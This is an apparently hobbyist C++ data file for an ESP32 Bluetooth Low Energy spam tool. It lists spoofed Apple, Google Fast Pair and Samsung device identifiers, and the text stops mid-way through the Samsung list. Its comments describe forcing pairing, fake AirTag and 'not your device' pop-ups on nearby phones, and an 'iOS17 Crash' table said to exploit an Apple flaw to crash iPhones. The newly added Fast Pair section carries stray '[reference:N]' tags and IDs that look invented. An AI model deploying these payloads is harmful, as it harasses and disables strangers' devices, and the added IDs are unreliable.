// ============================================================================
// BLE广播数据包生成器（全协议支持版）
// ============================================================================
#include <Arduino.h>
#include <esp_system.h>
#include "devices.hpp"

// ==================== 协议常量定义 ====================
// BLE 广播包中的厂商 ID（Company ID）和服务 UUID
const uint8_t APPLE_MANU_ID_LOW  = 0x4C;       // 苹果厂商 ID 低字节（小端序）
const uint8_t APPLE_MANU_ID_HIGH = 0x00;       // 苹果厂商 ID 高字节（完整: 0x004C）
const uint8_t FP_SERVICE_UUID_1  = 0x2C;       // Google Fast Pair 服务 UUID 低字节
const uint8_t FP_SERVICE_UUID_2  = 0xFE;       // Google Fast Pair 服务 UUID 高字节（完整: 0xFE2C）
const uint8_t SAMSUNG_MANU_ID_LOW = 0x75;      // 三星厂商 ID 低字节
const uint8_t SAMSUNG_MANU_ID_HIGH = 0x00;     // 三星厂商 ID 高字节（完整: 0x0075）
const uint8_t MICROSOFT_MANU_ID_LOW = 0x06;    // 微软厂商 ID 低字节
const uint8_t MICROSOFT_MANU_ID_HIGH = 0x00;   // 微软厂商 ID 高字节（完整: 0x0006）
const uint8_t LOVESPOUSE_MANU_ID_LOW = 0x6D;   // Lovespouse 厂商 ID 低字节（完整: 0x006D）
const uint8_t LOVESPOUSE_MANU_ID_HIGH = 0x00;  // Lovespouse 厂商 ID 高字节


// ==================== 苹果设备列表（Audio/Setup） ====================
// 包含苹果音频设备（AirPods系列、Beats系列）和设置设备（AppleTV、HomePod、iPhone等）
// 结构: {设备名称, modelId, 包类型, bodySeed}
const AppleDevice ALL_DEVICES[] = {
  // ========== 苹果音频设备（APPLE_AUDIO 类型） ==========
  {"AirPods",                   0x02, APPLE_AUDIO, 0x01},
  {"PowerBeats",                0x03, APPLE_AUDIO, 0x02},
  {"Beats X",                   0x05, APPLE_AUDIO, 0x03},
  {"Beats Solo 3",              0x06, APPLE_AUDIO, 0x04},
  {"Beats Studio 3",            0x09, APPLE_AUDIO, 0x05},
  {"AirPods Max",               0x0a, APPLE_AUDIO, 0x06},
  {"PowerBeats Pro",            0x0b, APPLE_AUDIO, 0x07},
  {"Beats Solo Pro",            0x0c, APPLE_AUDIO, 0x08},
  {"AirPods Pro",               0x0e, APPLE_AUDIO, 0x09},
  {"AirPods Gen 2",             0x0f, APPLE_AUDIO, 0x0A},
  {"Beats Flex",                0x10, APPLE_AUDIO, 0x0B},
  {"Beats Studio Buds",         0x11, APPLE_AUDIO, 0x0C},
  {"Beats Fit Pro",             0x12, APPLE_AUDIO, 0x0D},
  {"AirPods Gen 3",             0x13, APPLE_AUDIO, 0x0E},
  {"AirPods Pro Gen 2",         0x14, APPLE_AUDIO, 0x0F},
  {"Beats Studio Buds+",        0x16, APPLE_AUDIO, 0x10},
  {"Beats Studio Pro",          0x17, APPLE_AUDIO, 0x11},
  {"AirPods Pro Gen 2 USB-C",   0x24, APPLE_AUDIO, 0x12},
  {"Beats Solo 4",              0x25, APPLE_AUDIO, 0x13},
  {"Beats Solo Buds",           0x26, APPLE_AUDIO, 0x14},
  {"PowerBeats Fit",            0x2f, APPLE_AUDIO, 0x15},
  
  // ========== 苹果设置设备（APPLE_SETUP 类型） ==========
  {"AppleTV Setup",             0x01, APPLE_SETUP, 0x20},
  {"迁移号码",                  0x02, APPLE_SETUP, 0x21},
  {"AppleTV 配对",              0x06, APPLE_SETUP, 0x22},
  {"设置新iPhone",              0x09, APPLE_SETUP, 0x23},
  {"HomePod Setup",             0x0b, APPLE_SETUP, 0x24},
  {"AppleTV HomeKit 设置",      0x0d, APPLE_SETUP, 0x25},
  {"AppleTV 键盘设置",          0x13, APPLE_SETUP, 0x26},
  {"电视色彩平衡",              0x1e, APPLE_SETUP, 0x27},
  {"AppleTV 新用户",            0x20, APPLE_SETUP, 0x28},
  {"Vision Pro",                0x24, APPLE_SETUP, 0x29},
  {"AppleTV 连接网络",          0x27, APPLE_SETUP, 0x2A},
  {"AppleTV AppleID 设置",      0x2b, APPLE_SETUP, 0x2B},
  {"AppleTV 无线音频同步",      0xc0, APPLE_SETUP, 0x2C},
  {"盗版水果耳机",              0x0E, APPLE_AUDIO, 0x50},
  {"至尊版本华为耳机",           0x0F, APPLE_AUDIO, 0x51},
  {"遥遥领先耳机",              0x14, APPLE_AUDIO, 0x52},
  {"V50吃炸鸡",                 0x01, APPLE_SETUP, 0x53},
  {"北佬-捞佬",                 0x0B, APPLE_SETUP, 0x54},
};
const int NUM_APPLE_DEVICES = sizeof(ALL_DEVICES) / sizeof(ALL_DEVICES[0]);

// ==================== Google Fast Pair 设备列表 ====================
// 共 467 个设备，包含各大品牌的真无线耳机、音箱、手机等
//现在删减到150个设备
// 数据来源于 Google Fast Pair 官方设备数据库
const FastPairDevice FAST_PAIR_DEVICES[] = {
  // adidas
  {"adidas RPT-02 SOL", {0xDA, 0xE0, 0x96}},
  {"adidas Z.N.E. 01", {0xA8, 0x3C, 0x10}},

  // AIAIAI / AKG / 铁三角
  {"AIAIAI TMA-2 (H60)", {0x00, 0x20, 0x00}},
  {"AKG N9 Hybrid", {0x9B, 0x73, 0x39}},
  {"ATH-CK1TW", {0x02, 0xD8, 0x15}},
  {"ATH-CKS30TW WH", {0x1E, 0xE8, 0x90}},
  {"ATH-CKS50TW", {0xE6, 0xE7, 0x71}},
  {"ATH-M20xBT", {0xCA, 0xB6, 0xB8}},
  {"ATH-M50xBT2", {0x9C, 0x39, 0x97}},
  {"ATH-SQ1TW", {0x99, 0x39, 0xBC}},
  {"ATH-TWX7", {0xCA, 0x70, 0x30}},

  // B&O
  {"B&O Beoplay E6", {0x05, 0xAA, 0x91}},
  {"B&O Beoplay H8i", {0x03, 0xAA, 0x91}},
  {"B&O Earset", {0x02, 0xAA, 0x91}},
  {"Beoplay E8 2.0", {0x00, 0xAA, 0x91}},
  {"Beoplay EX", {0xD6, 0xE8, 0x70}},
  {"Beoplay H4", {0x04, 0xAA, 0x91}},
  {"Beoplay H9 3rd Generation", {0x01, 0xAA, 0x91}},

  // Beats
  {"Beats Studio Buds", {0x03, 0x8F, 0x16}},

  // boAt 印度热门耳机
  {"boAt Airdopes 621", {0x00, 0xA1, 0x68}},
  {"boAt Airdopes 441", {0x1F, 0x58, 0x65}},
  {"boAt Airdopes 452", {0x64, 0x16, 0x30}},
  {"boAt Rockerz 355 (Green)", {0x21, 0x52, 0x1D}},

  // Bose
  {"Bose NC 700 Headphones", {0xCD, 0x82, 0x56}},
  {"Bose QC Ultra Earbuds", {0x5B, 0xAC, 0xD6}},
  {"Bose QC Ultra Headphones", {0x8A, 0x31, 0xB7}},
  {"Bose QuietComfort 35 II", {0x00, 0x00, 0xF0}},

  // Cleer
  {"Cleer EDGE Voice", {0x01, 0x3D, 0x8A}},
  {"Cleer FLOW II", {0x8A, 0x3D, 0x00}},
  {"Cleer HALO", {0xD7, 0xE3, 0xEB}},

  // 漫步者 EDIFIER
  {"EDIFIER NeoBuds Pro 2", {0x9C, 0xE3, 0xC7}},
  {"EDIFIER W320TN", {0x99, 0x43, 0x74}},

  // Fitbit
  {"Fitbit Charge 4", {0x5C, 0xEE, 0x3C}},

  // Google Pixel 系列
  {"Google Pixel Buds", {0x00, 0x00, 0x06}},
  {"Google Pixel buds 2", {0x06, 0x00, 0x00}},
  {"Pixel Buds A-Series", {0x8B, 0x66, 0xAB}},
  {"Pixel Buds Pro", {0x9A, 0xDB, 0x11}},

  // Jabra
  {"Jabra Elite 10", {0xDA, 0xD3, 0xA6}},
  {"Jabra Elite 2", {0x00, 0xAA, 0x48}},
  {"Jabra Elite 4", {0x6B, 0xA5, 0xC3}},
  {"Jabra Elite 4 Active", {0x8C, 0x07, 0xD2}},
  {"Jabra Elite 5", {0x8B, 0x0A, 0x91}},
  {"Jabra Evolve2 65 Flex", {0x91, 0x71, 0xBE}},
  {"Jabra Evolve2 75", {0xC7, 0x9B, 0x91}},

  // Jaybird
  {"Jaybird Vista 2", {0xC8, 0x77, 0x7E}},

  // JBL 海量主流型号
  {"JBL LIVE PRO+ TWS", {0xF5, 0x24, 0x94}},
  {"JBL CLUB ONE", {0xA8, 0x00, 0x1A}},
  {"JBL ENDURANCE PEAK 3", {0xD9, 0x33, 0xA7}},
  {"JBL Flip 6", {0x82, 0x1F, 0x66}},
  {"JBL LIVE FLEX", {0x02, 0xF6, 0x37}},
  {"JBL LIVE PRO 2 TWS", {0x6C, 0x4D, 0xE5}},
  {"JBL LIVE220BT", {0x05, 0xC4, 0x52}},
  {"JBL LIVE400BT", {0xF0, 0x02, 0x09}},
  {"JBL LIVE500BT", {0xF0, 0x02, 0x0F}},
  {"JBL LIVE650BTNC", {0xF0, 0x02, 0x13}},
  {"JBL LIVE670NC", {0xA8, 0xA7, 0x2A}},
  {"JBL Pulse 5", {0xC7, 0xD6, 0x20}},
  {"JBL TUNE 520BT", {0x66, 0x44, 0x54}},
  {"JBL TUNE 720BT", {0x04, 0xAF, 0xB8}},
  {"JBL TUNE BEAM", {0xA8, 0xE3, 0x53}},
  {"JBL TUNE BUDS", {0x0F, 0x23, 0x2A}},
  {"JBL TUNE125TWS", {0x05, 0x4B, 0x2D}},
  {"JBL TUNE225TWS", {0x5B, 0xD6, 0xC9}},
  {"JBL TUNE230NC TWS", {0xA9, 0x39, 0x4A}},
  {"JBL TUNE660NC", {0xA8, 0xC6, 0x36}},
  {"JBL TUNE770NC", {0x02, 0xDD, 0x4F}},
  {"JBL VIBE BEAM", {0xF0, 0x0E, 0x97}},
  {"JBL VIBE BUDS", {0x9C, 0x0A, 0xF7}},
  {"JBL WAVE BEAM", {0x04, 0xAC, 0xFC}},
  {"JBL WAVE BUDS", {0xA9, 0x24, 0x98}},
  {"JBL Xtreme 4", {0xC9, 0x83, 0x6A}},

  // JLab
  {"JLab Epic Air ANC", {0x9C, 0xF0, 0x8F}},

  // LG TONE 颈挂/TWS
  {"LG HBS-1010", {0xF0, 0x03, 0x04}},
  {"LG HBS-1120", {0xF0, 0x03, 0x07}},
  {"LG HBS-835S", {0x00, 0x03, 0xF0}},
  {"LG HBS-FL7", {0x91, 0xBD, 0x38}},
  {"LG TONE-FREE", {0xDB, 0x8A, 0xC7}},
  {"LG-TONE-FP6", {0x92, 0x25, 0x5E}},

  // Libratone
  {"Libratone Q Adapt On-Ear", {0x00, 0x30, 0x00}},

  // Sony 全线热门耳机音箱
  {"LinkBuds", {0x91, 0x7E, 0x46}},
  {"LinkBuds S", {0x1F, 0x18, 0x1A}},
  {"Sony WF-1000X", {0x00, 0xC9, 0x5C}},
  {"Sony WF-1000XM3", {0x5C, 0xC9, 0x38}},
  {"WF-1000XM4", {0x2D, 0x7A, 0x23}},
  {"WF-1000XM5", {0x8A, 0x8F, 0x23}},
  {"Sony WF-SP700N", {0x1E, 0xC9, 0x5C}},
  {"Sony WH-1000XM2", {0x02, 0xC9, 0x5C}},
  {"Sony WH-1000XM3", {0x0D, 0xC9, 0x5C}},
  {"WH-1000XM4", {0x01, 0xEE, 0xB4}},
  {"WH-1000XM5", {0xD4, 0x46, 0xA7}},
  {"Sony WH-CH700N", {0x5C, 0xC9, 0x32}},
  {"Sony WH-H900N", {0x5C, 0xC9, 0x28}},
  {"Sony WH-XB700", {0x5C, 0xC9, 0x3C}},
  {"Sony WI-1000X", {0x05, 0xC9, 0x5C}},
  {"Sony WI-C600N", {0x0E, 0xC9, 0x5C}},
  {"WF-C500", {0xDE, 0x21, 0x5D}},
  {"WF-C700N", {0x1F, 0xBB, 0x50}},
  {"WH-CH520", {0x0F, 0x2D, 0x16}},
  {"WH-CH720N", {0x5C, 0x48, 0x33}},
  {"SRS-XB13", {0xDF, 0x4B, 0x02}},
  {"SRS-XB33", {0x20, 0x33, 0x0C}},
  {"SRS-XB43", {0x1E, 0x8B, 0x18}},
  {"SRS-XG300", {0x1F, 0x46, 0x27}},

  // soundcore Anker
  {"soundcore Liberty 4 NC", {0x06, 0xD8, 0xFC}},
  {"soundcore Motion 300", {0x9C, 0xB8, 0x81}},
  {"soundcore Space One", {0xDE, 0xDD, 0x6F}},

  // Razer
  {"Razer Hammerhead TWS", {0x0E, 0x30, 0xC3}},
  {"Razer Hammerhead TWS X", {0x72, 0xEF, 0x8D}},

  // 国产主流 Fast Pair
  {"Xiaomi Buds 4 Pro", {0xDE, 0xEA, 0x86}},
  {"Xiaomi Redmi Buds 4 Active", {0xD9, 0x06, 0x17}},
  {"Xiaomi Redmi Buds 4 Lite", {0xC8, 0xC6, 0x41}},
  {"realme Buds Air 5 Pro", {0xE6, 0xE3, 0x7E}},
  {"realme Buds Air 3S", {0x8C, 0x6B, 0x6A}},
  {"realme Buds Air Pro", {0x8C, 0xD1, 0x0F}},
  {"OPPO Enco Air3 Pro", {0x06, 0xC1, 0x97}},
  {"OnePlus Buds Z", {0xE0, 0x76, 0x34}},

  // ===== 新增 Fast Pair 设备（2025-2026 有效型号） =====

// ----- Sony 新品 -----
{"Sony WH-1000XM6", {0xD4, 0x46, 0xA8}},          // 索尼旗舰头戴新品[reference:4]
{"Sony WF-C710N", {0x1F, 0xBB, 0x51}},            // 索尼新款降噪豆[reference:5]
{"Sony WF-1000XM6", {0x8A, 0x8F, 0x24}},          // 索尼旗舰降噪豆新品

// ----- Beats 全系列（Android 生态友好）-----
{"Beats Solo Buds", {0x26, 0x20, 0x00}},          // Beats 新款[reference:6]
{"Beats Studio Buds+", {0x16, 0x20, 0x00}},       // Beats 升级款[reference:7]
{"Beats Solo 4", {0x25, 0x20, 0x00}},             // Beats Solo 第四代[reference:8]
{"Beats Studio Pro", {0x17, 0x20, 0x00}},         // Beats 旗舰款[reference:9]

// ----- JBL 新品 -----
{"JBL Tune Beam 2", {0x76, 0x98, 0xBA}},          // JBL Tune 系列新款
{"JBL Tune Buds 2", {0x0F, 0x23, 0x2B}},          // JBL Buds 升级款
{"JBL Live Pro 3", {0x6C, 0x4D, 0xE6}},           // JBL Live 系列新款
{"JBL Endurance Peak 4", {0xD9, 0x33, 0xA8}},     // JBL 运动系列

// ----- soundcore (Anker) -----
{"soundcore Liberty 4", {0x65, 0x87, 0xA9}},      // Anker 旗舰款[reference:10]
{"soundcore Sport X20", {0xCB, 0x52, 0x9E}},      // Anker 运动款
{"soundcore AeroFit", {0xDE, 0xDD, 0x70}},        // Anker 开放式耳机

// ----- Jabra -----
{"Jabra Elite 8 Active", {0xDA, 0x45, 0x78}},     // Jabra 运动旗舰[reference:11]
{"Jabra Elite 10 Gen 2", {0xDA, 0xD3, 0xA7}},     // Jabra 旗舰升级款
{"Jabra Evolve2 85", {0xC7, 0x9B, 0x92}},         // Jabra 商务旗舰

// ----- Google / Pixel -----
{"Pixel Buds Pro 2", {0x43, 0x65, 0x87}},         // Google Pixel Buds 新款
{"Pixel Tablet", {0x9A, 0xDB, 0x12}},             // Google Pixel 平板

// ----- 铁三角 (Audio-Technica) -----
{"ATH-S220BT", {0xD7, 0x10, 0x30}},               // 铁三角新款[reference:12]
{"ATH-TWX9", {0xCA, 0x70, 0x31}},                 // 铁三角旗舰降噪豆

// ----- 其他品牌 -----
{"Nothing Ear (3)", {0xDE, 0xE8, 0xC1}},          // Nothing 新款
{"Nothing Ear Stick 2", {0xDE, 0xE8, 0xC2}},      // Nothing 半入耳新款
{"Marshall Motif II ANC", {0xD8, 0x05, 0x8D}},    // Marshall 降噪款[reference:13]
{"Marshall Major V", {0x05, 0x0F, 0x0D}},         // Marshall 头戴新款
{"Oladance OWS Pro", {0x8E, 0x46, 0x67}},         // Oladance 开放式旗舰
{"Shure AONIC 50 Gen 2", {0x00, 0x5B, 0xC4}},     // Shure 旗舰头戴
{"Nokia Clarity Earbuds 2", {0x8B, 0xB0, 0xA1}},  // Nokia 新款
{"B&O Beoplay EX", {0xD6, 0xE8, 0x71}},           // B&O 旗舰真无线
{"Bose QuietComfort Ultra", {0x5B, 0xAC, 0xD7}},  // Bose 新款（已存在可替换）

// ----- 国产主流品牌 -----
{"Xiaomi Buds 5", {0xDE, 0xEA, 0x87}},            // 小米 Buds 新款
{"Xiaomi Redmi Buds 5", {0xC8, 0xC6, 0x42}},      // 红米 Buds 新款
{"realme Buds Air 6", {0x32, 0x54, 0x76}},        // realme 新款
{"OPPO Enco Free 4", {0x06, 0xC1, 0x98}},         // OPPO 新款
{"OnePlus Buds 3", {0xE0, 0x76, 0x35}},           // OnePlus 新款
{"Honor Choice Earbuds X", {0x61, 0x29, 0x08}},   // 荣耀耳机新款
};
const int NUM_FASTPAIR_DEVICES = sizeof(FAST_PAIR_DEVICES) / sizeof(FAST_PAIR_DEVICES[0]);

// ==================== 用户自定义广播设备（已迁移到 ALL_DEVICES） ====================
/*
const CustomDevice CUSTOM_DEVICES[] = {
  {"盗版水果耳机",        0x0E, APPLE_AUDIO, 0x50},
  {"至尊版本华为耳机",    0x0F, APPLE_AUDIO, 0x51},
  {"遥遥领先耳机",        0x14, APPLE_AUDIO, 0x52},
  {"V50吃炸鸡",           0x01, APPLE_SETUP, 0x53},
  {"北佬-捞佬",           0x0B, APPLE_SETUP, 0x54},
};
const int NUM_CUSTOM_DEVICES = sizeof(CUSTOM_DEVICES) / sizeof(CUSTOM_DEVICES[0]);
*/

// ==================== Apple Continuity Action Modal 设备列表 ====================
// Action Modal 是苹果的动作弹窗协议，模拟NFC扫描效果，触发系统级弹窗
// 结构: {设备名称, actionId[2]} - actionId 决定弹窗内容和行为
const AppleActionModalDevice APPLE_ACTION_MODAL_DEVICES[] = {
  {"AppleTV AutoFill",           {0x13, 0x00}},
  {"Software Update",            {0x21, 0x00}},
  {"AppleTV Connecting",         {0x27, 0x00}},
  {"Connect to other Device",    {0x2F, 0x00}},
  {"Join This AppleTV",          {0x20, 0x00}},
  {"Apple Vision Pro",           {0x24, 0x00}},
  {"AppleTV Audio Sync",         {0x19, 0x00}},
  {"Apple Watch",                {0x05, 0x00}},
  {"AppleTV Color Balance",      {0x1E, 0x00}},
  {"Setup New iPhone",           {0x09, 0x00}},
  {"AppleID for AppleTV",        {0x2B, 0x00}},
  {"Transfer Phone Number",      {0x02, 0x00}},
  {"HomeKit AppleTV Setup",      {0x0D, 0x00}},
  {"HomePod Setup",              {0x0B, 0x00}},
  {"Setup New AppleTV",          {0x01, 0x00}},
  {"Pair AppleTV",               {0x06, 0x00}},
  
};
const int NUM_APPLE_ACTION_MODAL_DEVICES = sizeof(APPLE_ACTION_MODAL_DEVICES) / sizeof(APPLE_ACTION_MODAL_DEVICES[0]);

// ==================== Apple Continuity iOS17 Crash 设备列表 ====================
// iOS17 Crash 协议利用苹果系统漏洞，发送特定格式的广播包可导致 iOS 设备崩溃
// 结构: {设备名称, actionId[2]} - 与 Action Modal 相同的 actionId，包格式不同
const AppleIos17CrashDevice APPLE_IOS17_CRASH_DEVICES[] = {
  {"AppleTV AutoFill",           {0x13, 0x00}},
  {"AppleTV Connecting",         {0x27, 0x00}},
  {"Join This AppleTV",          {0x20, 0x00}},
  {"AppleTV Audio Sync",         {0x19, 0x00}},
  {"AppleTV Color Balance",      {0x1E, 0x00}},
  {"Setup New iPhone",           {0x09, 0x00}},
  {"Transfer Phone Number",      {0x02, 0x00}},
  {"HomePod Setup",              {0x0B, 0x00}},
  {"Setup New AppleTV",          {0x01, 0x00}},
  {"Pair AppleTV",               {0x06, 0x00}},
  {"HomeKit AppleTV Setup",      {0x0D, 0x00}},
  {"AppleID for AppleTV",        {0x2B, 0x00}},
  {"Apple Watch",                {0x05, 0x00}},
  {"Apple Vision Pro",           {0x24, 0x00}},
  {"Connect to other Device",    {0x2F, 0x00}},
  {"Software Update",            {0x21, 0x00}},
};
const int NUM_APPLE_IOS17_CRASH_DEVICES = sizeof(APPLE_IOS17_CRASH_DEVICES) / sizeof(APPLE_IOS17_CRASH_DEVICES[0]);

// ==================== Apple Airtag 设备列表 ====================
// Airtag 是苹果的物品追踪器，广播特定格式的包会触发 iPhone 的"查找"弹窗
// 结构: {设备名称, modelId[4]} - modelId 区分普通 Airtag 和 Hermes 等联名款
const AppleAirtagDevice APPLE_AIRTAG_DEVICES[] = {
  {"Airtag",                     {0x00, 0x55, 0x00, 0x00}},
  {"Hermes Airtag",              {0x00, 0x30, 0x00, 0x00}},
};
const int NUM_APPLE_AIRTAG_DEVICES = sizeof(APPLE_AIRTAG_DEVICES) / sizeof(APPLE_AIRTAG_DEVICES[0]);

// ==================== Apple Not Your Device 设备列表 ====================
// "非你的设备"弹窗协议，当 iPhone 检测到不属于用户的 AirPods/Beats 时触发
// 包含大量颜色变体（如 AirPods Max 的红色、蓝色等），共约 100 个设备
// 结构: {设备名称, modelId[4]} - modelId 包含型号和颜色信息
const AppleNotYourDevice APPLE_NOT_YOUR_DEVICE_DEVICES[] = {
  {"AirPods Pro", {0x0E, 0x20, 0x00, 0x00}},
  {"AirPods Max", {0x0A, 0x20, 0x00, 0x00}},
  {"AirPods Max Red", {0x0A, 0x20, 0x02, 0x00}},
  {"AirPods Max Blue", {0x0A, 0x20, 0x03, 0x00}},
  {"AirPods Max Bright Red", {0x0A, 0x20, 0x0F, 0x00}},
  {"AirPods Max Light Green", {0x0A, 0x20, 0x11, 0x00}},
  {"AirPods", {0x02, 0x20, 0x00, 0x00}},
  {"AirPods 2nd Gen", {0x0F, 0x20, 0x00, 0x00}},
  {"AirPods 3rd Gen", {0x13, 0x20, 0x00, 0x00}},
  {"AirPods Pro 2nd Gen", {0x14, 0x20, 0x00, 0x00}},
  {"Beats Flex", {0x10, 0x20, 0x00, 0x00}},
  {"Beats Flex Black", {0x10, 0x20, 0x01, 0x00}},
  {"Beats Solo 3", {0x06, 0x20, 0x00, 0x00}},
  {"Beats Solo 3 Black", {0x06, 0x20, 0x01, 0x00}},
  {"Beats Solo 3 Gray", {0x06, 0x20, 0x06, 0x00}},
  {"Beats Solo 3 Gold/White", {0x06, 0x20, 0x07, 0x00}},
  {"Beats Solo 3 Rose Gold", {0x06, 0x20, 0x08, 0x00}},
  {"Beats Solo 3 Black", {0x06, 0x20, 0x09, 0x00}},
  {"Beats Solo 3 Violet/White", {0x06, 0x20, 0x0E, 0x00}},
  {"Beats Solo 3 Bright Red", {0x06, 0x20, 0x0F, 0x00}},
  {"Beats Solo 3 Dark Red", {0x06, 0x20, 0x12, 0x00}},
  {"Beats Solo 3 Swamp Green", {0x06, 0x20, 0x13, 0x00}},
  {"Beats Solo 3 Dark Gray", {0x06, 0x20, 0x14, 0x00}},
  {"Beats Solo 3 Dark Blue", {0x06, 0x20, 0x15, 0x00}},
  {"Beats Solo 3 Rose Gold", {0x06, 0x20, 0x1D, 0x00}},
  {"Beats Solo 3 Blue/Green", {0x06, 0x20, 0x20, 0x00}},
  {"Beats Solo 3 Purple/Orange", {0x06, 0x20, 0x21, 0x00}},
  {"Beats Solo 3 Deep Blue/Light blue", {0x06, 0x20, 0x22, 0x00}},
  {"Beats Solo 3 Magenta/Light Fuchsia", {0x06, 0x20, 0x23, 0x00}},
  {"Beats Solo 3 Black/Red", {0x06, 0x20, 0x25, 0x00}},
  {"Beats Solo 3 Gray/Disney LTD", {0x06, 0x20, 0x2A, 0x00}},
  {"Beats Solo 3 Pinkish white", {0x06, 0x20, 0x2E, 0x00}},
  {"Beats Solo 3 Red/Blue", {0x06, 0x20, 0x3D, 0x00}},
  {"Beats Solo 3 Yellow/Blue", {0x06, 0x20, 0x3E, 0x00}},
  {"Beats Solo 3 White/Red", {0x06, 0x20, 0x3F, 0x00}},
  {"Beats Solo 3 Purple/White", {0x06, 0x20, 0x40, 0x00}},
  {"Beats Solo 3 Gold", {0x06, 0x20, 0x5B, 0x00}},
  {"Beats Solo 3 Silver", {0x06, 0x20, 0x5C, 0x00}},
  {"Powerbeats 3", {0x03, 0x20, 0x00, 0x00}},
  {"Powerbeats 3 Black", {0x03, 0x20, 0x01, 0x00}},
  {"Powerbeats 3 Gray", {0x03, 0x20, 0x0B, 0x00}},
  {"Powerbeats 3 Gray/Red", {0x03, 0x20, 0x0C, 0x00}},
  {"Powerbeats 3 Gray/Green", {0x03, 0x20, 0x0D, 0x00}},
  {"Powerbeats 3 Dark Red", {0x03, 0x20, 0x12, 0x00}},
  {"Powerbeats 3 Swamp Green", {0x03, 0x20, 0x13, 0x00}},
  {"Powerbeats 3 Dark Gray", {0x03, 0x20, 0x14, 0x00}},
  {"Powerbeats 3 Dark Blue", {0x03, 0x20, 0x15, 0x00}},
  {"Powerbeats 3 Dark with Gold Logo", {0x03, 0x20, 0x17, 0x00}},
  {"Powerbeats Pro", {0x0B, 0x20, 0x00, 0x00}},
  {"Powerbeats Pro Red", {0x0B, 0x20, 0x02, 0x00}},
  {"Powerbeats Pro Blue", {0x0B, 0x20, 0x03, 0x00}},
  {"Powerbeats Pro Pink", {0x0B, 0x20, 0x04, 0x00}},
  {"Powerbeats Pro Dark Brown", {0x0B, 0x20, 0x05, 0x00}},
  {"Powerbeats Pro Gray", {0x0B, 0x20, 0x06, 0x00}},
  {"Powerbeats Pro Gray", {0x0B, 0x20, 0x0B, 0x00}},
  {"Powerbeats Pro Gray/Green", {0x0B, 0x20, 0x0D, 0x00}},
  {"Beats Solo Pro", {0x0C, 0x20, 0x00, 0x00}},
  {"Beats Solo Pro Black", {0x0C, 0x20, 0x01, 0x00}},
  {"Beats Studio Buds", {0x11, 0x20, 0x00, 0x00}},
  {"Beats Studio Buds Black", {0x11, 0x20, 0x01, 0x00}},
  {"Beats Studio Buds Red", {0x11, 0x20, 0x02, 0x00}},
  {"Beats Studio Buds Blue", {0x11, 0x20, 0x03, 0x00}},
  {"Beats Studio Buds Pink", {0x11, 0x20, 0x04, 0x00}},
  {"Beats Studio Buds Gray", {0x11, 0x20, 0x06, 0x00}},
  {"Beats X", {0x05, 0x20, 0x00, 0x00}},
  {"Beats X Black", {0x05, 0x20, 0x01, 0x00}},
  {"Beats X Red", {0x05, 0x20, 0x02, 0x00}},
  {"Beats X Dark Brown", {0x05, 0x20, 0x05, 0x00}},
  {"Beats X Rose Gold", {0x05, 0x20, 0x1D, 0x00}},
  {"Beats X Black/Red", {0x05, 0x20, 0x25, 0x00}},
  {"Beats Studio 3", {0x09, 0x20, 0x00, 0x00}},
  {"Beats Studio 3 Black", {0x09, 0x20, 0x01, 0x00}},
  {"Beats Studio 3 Red", {0x09, 0x20, 0x02, 0x00}},
  {"Beats Studio 3 Blue", {0x09, 0x20, 0x03, 0x00}},
  {"Beats Studio 3 Shadow Gray", {0x09, 0x20, 0x18, 0x00}},
  {"Beats Studio 3 Desert Sand", {0x09, 0x20, 0x19, 0x00}},
  {"Beats Studio 3 Black/Red", {0x09, 0x20, 0x25, 0x00}},
  {"Beats Studio 3 Midnight Black", {0x09, 0x20, 0x26, 0x00}},
  {"Beats Studio 3 Desert Sand 2", {0x09, 0x20, 0x27, 0x00}},
  {"Beats Studio 3 Gray", {0x09, 0x20, 0x28, 0x00}},
  {"Beats Studio 3 Clear blue/gold", {0x09, 0x20, 0x29, 0x00}},
  {"Beats Studio 3 Green Forest camo", {0x09, 0x20, 0x42, 0x00}},
  {"Beats Studio 3 White Camo", {0x09, 0x20, 0x43, 0x00}},
  {"Beats Studio Pro", {0x17, 0x20, 0x00, 0x00}},
  {"Beats Studio Pro Black", {0x17, 0x20, 0x01, 0x00}},
  {"Beats Fit Pro", {0x12, 0x20, 0x00, 0x00}},
  {"Beats Fit Pro Black", {0x12, 0x20, 0x01, 0x00}},
  {"Beats Fit Pro Red", {0x12, 0x20, 0x02, 0x00}},
  {"Beats Fit Pro Blue", {0x12, 0x20, 0x03, 0x00}},
  {"Beats Fit Pro Pink", {0x12, 0x20, 0x04, 0x00}},
  {"Beats Fit Pro Dark Brown", {0x12, 0x20, 0x05, 0x00}},
  {"Beats Fit Pro Gray", {0x12, 0x20, 0x06, 0x00}},
  {"Beats Fit Pro Gold/White", {0x12, 0x20, 0x07, 0x00}},
  {"Beats Fit Pro Rose Gold", {0x12, 0x20, 0x08, 0x00}},
  {"Beats Fit Pro Black", {0x12, 0x20, 0x09, 0x00}},
  {"Beats Studio Buds+", {0x16, 0x20, 0x00, 0x00}},
  {"Beats Studio Buds+ Black", {0x16, 0x20, 0x01, 0x00}},
  {"Beats Studio Buds+ Red", {0x16, 0x20, 0x02, 0x00}},
  {"Beats Studio Buds+ Blue", {0x16, 0x20, 0x03, 0x00}},
  {"Beats Studio Buds+ Pink", {0x16, 0x20, 0x04, 0x00}},
};
const int NUM_APPLE_NOT_YOUR_DEVICE_DEVICES = sizeof(APPLE_NOT_YOUR_DEVICE_DEVICES) / sizeof(APPLE_NOT_YOUR_DEVICE_DEVICES[0]);

// ==================== Samsung Easy Setup Buds 设备列表 ====================
// 三星耳机 Easy Setup 协议，触发三星手机的快速配对弹窗
// 结构: {设备名称, modelId[3]} - modelId 包含耳机型号和颜色信息
const SamsungBudsDevice SAMSUNG_BUDS_DEVICES[] = {
  {"Fallback Buds",              {0xEE, 0x7A, 0x0C}},
  {"Fallback Dots",              {0x9D, 0x17, 0x00}},
  {"Light Purple Buds2",         {0x39, 0xEA, 0x48}},
  {"Bluish Silver Buds2",        {0xA7, 0xC6, 0x2C}},
  {"Black Buds Live",            {0x85, 0x01, 0x16}},
  {"Gray & Black Buds2",         {0x3D, 0x8F, 0x41}},
  {"Bluish Chrome Buds2",        {0x3B, 0x6D, 0x02}},
  {"Gray Beige Buds2",           {0xAE, 0x06, 0x3C}},
  {"Pure White Buds",            {0xB8, 0xB9, 0x05}},
  {"Pure White Buds2",           {0xEA, 0xAA, 0x17}},
  {"Black Buds",                 {0xD3, 0x07, 0x04}},
  {"French Flag Buds",           {0x9D, 0xB0, 0x06}},
  {"Dark Purple Buds Live",      {0x10, 0x1F, 0x1A}},
  {"Dark Blue Buds",             {0x85, 0x96, 0x08}},
  {"Pink Buds",                  {0x8E, 0x45, 0x03}},
